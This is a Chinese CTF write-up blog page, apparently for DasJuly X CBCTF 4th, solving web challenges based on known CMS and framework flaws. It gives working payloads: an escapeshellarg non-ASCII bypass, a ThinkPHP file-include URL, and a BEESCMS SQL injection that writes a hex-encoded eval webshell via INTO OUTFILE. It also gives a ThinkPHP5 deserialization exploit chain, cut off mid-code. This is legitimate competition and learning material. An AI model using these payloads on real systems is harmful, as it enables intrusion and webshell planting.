@@ -1,0 +1,713 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般 Web ezrce 参考：Yapi远程"><title>DasJuly X CBCTF 4th 部分wp</title>
+<link rel=canonical href=https://k1te.cn/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="DasJuly X CBCTF 4th 部分wp"><meta property='og:description' content="emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般 Web ezrce 参考：Yapi远程"><meta property='og:url' content='https://k1te.cn/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/'><meta property='og:site_name' content="k1te's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='wp'><meta property='article:tag' content='ctf'><meta property='article:published_time' content='2021-08-03T10:42:08+08:00'><meta property='article:modified_time' content='2021-08-03T10:42:08+08:00'><meta name=twitter:title content="DasJuly X CBCTF 4th 部分wp"><meta name=twitter:description content="emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般 Web ezrce 参考：Yapi远程"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hub6c78dfe06f1a54a6fd33c0996ec5489_36353_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎯</span></figure><div class=site-meta><h1 class=site-name><a href=/>k1te's blog</a></h1><h2 class=site-description>Whereof one cannot speak, thereof one must be silent.</h2></div></header><ol class=menu-social><li><a href=https://github.com/zk1te target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#ezrce>ezrce</a></li><li><a href=#cat-flag>cat flag</a></li><li><a href=#easythinkphp>easythinkphp</a></li><li><a href=#jspxcms>jspxcms</a></li><li><a href=#cybercms>cybercms</a></li><li><a href=#ez_website>ez_website</a></li><li><a href=#jjs-camera>jj&rsquo;s camera</a></li></ol><ol><li><a href=#just-a-gif>Just a GIF</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E9%A2%98%E8%A7%A3/>题解</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/>DasJuly X CBCTF 4th 部分wp</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Aug 03, 2021</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 8 分钟</time></div></footer></div></header><section class=article-content><p>emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般</p><h1 id=web>Web</h1><h2 id=ezrce>ezrce</h2><p>参考：<a class=link href=https://www.freebuf.com/vuls/279967.html target=_blank rel=noopener>Yapi远程命令执行漏洞复现 - FreeBuf网络安全行业门户</a>，直接打就行</p><h2 id=cat-flag>cat flag</h2><p>直接给源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$cmd</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag/i&#39;</span><span class=p>,</span><span class=nv>$cmd</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cat &#39;</span> <span class=o>.</span> <span class=nv>$cmd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>cmd参数不能包含flag关键词，然后经过escapeshellarg函数之后执行cat命令。</p><p>有个hint：管理员曾访问过flag。</p><p>经过一番查找，找到了nignx的access.log，payload:<code>/?cmd=/var/log/nginx/access.log</code>，可以看到有一个<code>/this_is_final_flag_e2a457126032b42d.php</code>，应该就是要cat这个文件了，但是文件名里包含了flag关键词，而且又经过了escapeshellarg函数，没法命令注入</p><p>找了蛮久的，最后在文档里找到这么一个评论</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210803113926870.png loading=lazy></p><p>意思大概是escapeshellarg会在没有设置lang环境变量的时候将非ASCII字符丢弃，所以我们可以使用非ASCII字符绕过，最终payload：<code>/?cmd=this_is_final_fl%ffag_e2a457126032b42d.php</code></p><p>其实早上的时候就看到了相关的文章：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210803150338153.png loading=lazy alt=image-20210803150338153></p><p>但是当时尝试的是<code>ā</code>这个字符，不知道为啥不行</p><h2 id=easythinkphp>easythinkphp</h2><p>一个thinkphp3.2.3比较新的洞，参考：<a class=link href=https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ target=_blank rel=noopener>【漏洞通报】ThinkPHP3.2.x RCE漏洞通报 (qq.com)</a></p><p>最终payload：<code>/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=../../../flag</code></p><h2 id=jspxcms>jspxcms</h2><p>参考：<a class=link href=https://lockcy.github.io/2019/10/18/%e5%a4%8d%e7%8e%b0jspxcms%e8%a7%a3%e5%8e%8bgetshell%e6%bc%8f%e6%b4%9e/ target=_blank rel=noopener>复现jspxcms解压getshell漏洞 | lockcy&rsquo;s cave</a></p><p>需要管理员的权限，比赛的时候是公用靶机，每十分钟重置一次，刚开始的时候进不了后台找不到点，后面就盯着重置然后冲进去改密码hh</p><p>需要用到冰蝎，冰蝎的坑具体参考：<a class=link href=https://github.com/rebeyond/Behinder/issues/115 target=_blank rel=noopener>为啥子java14还是运行不了 · Issue #115 · rebeyond/Behinder (github.com)</a></p><p>最后：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804114352821.png loading=lazy alt=image-20210804114352821></p><h2 id=cybercms>cybercms</h2><p>www.zip有源码</p><p>根据源码的信息确定是BEESCMS，网上寻找相关漏洞利用，大概找到这么几篇吧：</p><p><a class=link href=https://bbs.ichunqiu.com/thread-12635-1-1.html target=_blank rel=noopener>【代码审计初探】beescms v4.0_R SQL_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p><p><a class=link href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=13606&amp;page=1" target=_blank rel=noopener>【代码审计】对Beescms SQL注入漏洞的进一步思考_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p><p><a class=link href="https://bbs.ichunqiu.com/thread-13977-1-1.html?from=st&amp;hmsr=toutiao.io&amp;utm_campaign=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io" target=_blank rel=noopener>【送0day】代码审计就该这么来3 beescms getshell_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p><p>session覆盖可以进入后台，但是上传的时候显示permission deny，于是转向sql注入。</p><p>与源码对比发现出题人增加了一个过滤函数，并且把报错关了（没找到报错在哪关了。。）：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804115803695.png loading=lazy alt=image-20210804115803695></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804115731493.png loading=lazy alt=image-20210804115731493></p><p>可以看到这个过滤还是很好绕的，上面的用双写绕过，下面的用<code>/**/</code>绕过即可</p><p>实际测试发现经过<code>htmlspecialchars</code>的字符可以注入到sql语句，但是没法正常放进数据库里（tcl，不知道为啥）</p><p>最终payload：<code>user=admin%27/**/un+union+ion/**/selselectect/**/null,null,null,null,0x3c3f70687020686967686c696768745f66696c65285f5f46494c455f5f293b406576616c28245f504f53545b6b3174655d293b3f3e/**/into/**/outoutfilefile/**/%27/var/www/html/shell.php%27%23</code></p><p>效果：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804132813071.png loading=lazy alt=image-20210804132813071></p><h2 id=ez_website>ez_website</h2><p>参考：<a class=link href=https://ma4ter.cn/2527.html target=_blank rel=noopener>齐博建站系统x1.0代码审计 - Ma4ter Blog</a></p><p>labelmodels控制器get_label方法直接将tag_arrar数组键cfg的值进行了反序列化：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804133315610.png loading=lazy alt=image-20210804133315610></p><p>直接拿tp5的pop链打就行，网上找了个exp：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\process\pipes</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Windows</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$files</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$files</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>files</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$files</span><span class=p>];</span> <span class=c1>//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>abstract</span> <span class=k>class</span> <span class=nc>Model</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$append</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$error</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=nv>$parent</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$modelRelation</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>parent</span> <span class=o>=</span> <span class=nv>$output</span><span class=p>;</span>  <span class=c1>//$this-&gt;parent=&gt; think\console\Output;
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>append</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;xxx&#34;</span><span class=o>=&gt;</span><span class=s2>&#34;getError&#34;</span><span class=p>);</span>     <span class=c1>//调用getError 返回this-&gt;error
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span> <span class=o>=</span> <span class=nv>$modelRelation</span><span class=p>;</span>               <span class=c1>// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>think\Model</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Pivot</span> <span class=k>extends</span> <span class=nx>Model</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$modelRelation</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>__construct</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$modelRelation</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model\relation</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>HasOne</span> <span class=k>extends</span> <span class=nx>OneToOne</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model\relation</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>abstract</span> <span class=k>class</span> <span class=nc>OneToOne</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$selfRelation</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$bindAttr</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$query</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>selfRelation</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>query</span> <span class=o>=</span> <span class=nv>$query</span><span class=p>;</span>    <span class=c1>//$query指向Query
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>bindAttr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;xxx&#39;</span><span class=p>];</span><span class=c1>// $value值，作为call函数引用的第二变量
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\db</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Query</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$model</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$model</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>model</span> <span class=o>=</span> <span class=nv>$model</span><span class=p>;</span> <span class=c1>//$this-&gt;model=&gt; think\console\Output;
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\console</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Output</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$handle</span><span class=p>;</span>
